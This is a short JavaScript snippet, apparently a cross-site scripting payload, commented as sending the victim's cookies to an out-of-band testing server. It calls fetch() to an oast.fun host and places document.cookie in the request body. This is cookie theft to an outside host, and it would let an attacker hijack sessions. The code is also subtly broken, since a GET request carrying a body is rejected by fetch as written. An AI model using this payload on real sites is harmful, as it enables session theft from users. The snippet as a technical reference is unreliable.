// Send cookies to your OAST server
fetch('https://tetenplixlclsrgugyrk29jxjsbg98hkd.oast.fun', {
  method: 'GET',
  body: `Cookies: ${document.cookie}`,
});
